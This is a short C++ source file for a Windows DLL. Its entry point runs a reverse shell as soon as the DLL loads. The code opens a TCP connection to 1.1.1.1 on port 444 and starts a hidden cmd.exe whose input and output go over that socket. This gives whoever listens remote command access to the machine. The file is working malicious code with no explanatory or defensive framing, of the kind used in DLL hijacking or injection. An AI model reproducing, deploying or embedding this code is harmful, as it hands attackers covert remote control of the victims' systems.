// dllmain.cpp : 定义 DLL 应用程序的入口点。
#define _WINSOCK_DEPRECATED_NO_WARNINGS 0
#pragma warning（disable：4996）
#include "pch.h"
#include <WinSock2.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32")

void reverse_shell();
WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		//WinExec("calc.exe", SW_HIDE);
		reverse_shell();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void reverse_shell()
{
	LPCSTR szMyUniqueNamedEvent = "sysnullevt";
	HANDLE m_hEvent = CreateEventA(NULL, TRUE, FALSE, szMyUniqueNamedEvent);

	switch (GetLastError())
	{
		// app is already running
	case ERROR_ALREADY_EXISTS:
	{
		CloseHandle(m_hEvent);
		break;
	}

	case ERROR_SUCCESS:
	{

		break;
	}
	}


	WSAStartup(MAKEWORD(2, 2), &wsaData);
	Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(atoi("444"));

	hax.sin_addr.s_addr = inet_addr("1.1.1.1");
	WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&ini_processo, 0, sizeof(ini_processo));
	ini_processo.cb = sizeof(ini_processo);
	ini_processo.dwFlags = STARTF_USESTDHANDLES;
	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&ini_processo, &processo_info);



}
